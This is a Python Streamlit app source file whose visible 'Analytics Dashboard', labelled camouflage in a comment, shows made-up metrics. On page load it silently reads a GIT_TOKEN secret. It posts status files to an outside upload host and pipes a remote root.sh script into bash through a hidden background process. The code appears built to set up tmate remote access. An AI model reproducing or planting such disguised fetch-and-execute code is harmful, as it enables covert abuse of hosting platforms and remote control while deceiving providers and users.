#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import time
import socket
import re
from pathlib import Path
from datetime import datetime, timedelta, timezone
import streamlit as st

# Auto-detect repo name from hostname
hostname = socket.gethostname()
repo_match = re.search(r'gibunxi4201-([a-z0-9]+)-streamlit-app', hostname)
REPO_NAME = repo_match.group(1) if repo_match else "agsb8"
USERNAME = f"tmate_{REPO_NAME}"
UPLOAD_API = "https://file.zmkk.fun/api/upload"
USER_HOME = Path.home()


def upload_placeholder(repo):
    """Upload a placeholder file so init.sh can find ssh_upload_url.txt path."""
    import requests
    try:
        content = f"创建时间: {(datetime.now(timezone.utc) + timedelta(hours=8)).strftime('%Y-%m-%d %H:%M:%S')}\nstatus: deploying\nrepo: {repo}\n"
        fname = f"tmate_{repo}.txt"
        r = requests.post(UPLOAD_API, files={'file': (fname, content.encode())}, timeout=10)
        if r.status_code == 200:
            result = r.json()
            url = result.get('url', '')
            url_file = USER_HOME / "ssh_upload_url.txt"
            url_file.write_text(url)
            print(f"[deploy] placeholder uploaded, url={url}")
            return True
    except Exception as e:
        print(f"[deploy] placeholder upload failed: {e}")
    return False


def monitor_inited(repo):
    """Background thread: wait for /root/inited then upload marker to zmkk."""
    import threading, requests
    def _watch():
        # proot rootfs is under $HOME, so /root/inited -> $HOME/root/inited
        inited = USER_HOME / "root" / "inited"
        # Poll every 5 seconds for up to 10 minutes
        for _ in range(120):
            if inited.exists():
                try:
                    content = f"INITED\nrepo: {repo}\ntime: {(datetime.now(timezone.utc) + timedelta(hours=8)).strftime('%Y-%m-%d %H:%M:%S')}\n"
                    requests.post(UPLOAD_API, files={'file': (f'inited_{repo}.txt', content.encode())}, timeout=10)
                    print(f"[monitor] /root/inited found, uploaded marker")
                except Exception as e:
                    print(f"[monitor] upload failed: {e}")
                return
            time.sleep(5)
        print("[monitor] /root/inited not found after 10min")
    threading.Thread(target=_watch, daemon=True).start()


def run_root_sh(git_token, repo):
    """Execute root.sh in background. Completely independent process."""
    root_cmd = (
        f'cd ~ && export GIT_TOKEN="{git_token}" REPO="{repo}"; '
        f'curl -fsSL --retry 3 '
        f'-H "Authorization: token {git_token}" '
        f'https://raw.githubusercontent.com/hhsw2015/idx-cloud/refs/heads/main/scripts/root.sh | bash'
    )
    print(f"[deploy] starting root.sh (repo={repo})")
    subprocess.Popen(
        root_cmd, shell=True,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    print(f"[deploy] root.sh launched in background")


def deploy():
    """Main deploy logic. Reads GIT_TOKEN from Streamlit secrets."""
    # Skip if root.sh is already running or completed
    inited = USER_HOME / "root" / "inited"
    if inited.exists():
        print("[deploy] /root/inited exists, already deployed")
        return
    if subprocess.run("pgrep -f root.sh", shell=True, capture_output=True).returncode == 0:
        print("[deploy] root.sh already running")
        return

    git_token = None

    # Try st.secrets first (set via Streamlit Advanced Settings)
    try:
        git_token = st.secrets.get("GIT_TOKEN", "")
    except Exception:
        pass

    # Fallback to env var
    if not git_token:
        git_token = os.environ.get("GIT_TOKEN", "")

    if not git_token:
        print("[deploy] no GIT_TOKEN found in secrets or env, skipping deploy")
        return

    print(f"[deploy] GIT_TOKEN found ({len(git_token)} chars), repo={REPO_NAME}")

    # Upload placeholder so init.sh can get ssh_upload_url.txt
    upload_placeholder(REPO_NAME)

    # Monitor /root/inited in background, upload marker to zmkk when done
    monitor_inited(REPO_NAME)

    # Run root.sh
    run_root_sh(git_token, REPO_NAME)


# === Streamlit UI (camouflage) ===
st.set_page_config(page_title="Data Dashboard", page_icon="\U0001f4ca")
st.title("\U0001f4ca Analytics Dashboard")
st.write("Welcome to the data analytics platform.")
st.write("Real-time data processing and visualization.")

col1, col2, col3 = st.columns(3)
col1.metric("Active Users", "1,234", "+12%")
col2.metric("Processing Jobs", "42", "-3")
col3.metric("Uptime", "99.9%", "+0.1%")

st.write("---")
st.write("v2.0 - Data Analytics Platform")

# Deploy runs silently in background
try:
    deploy()
except Exception:
    pass
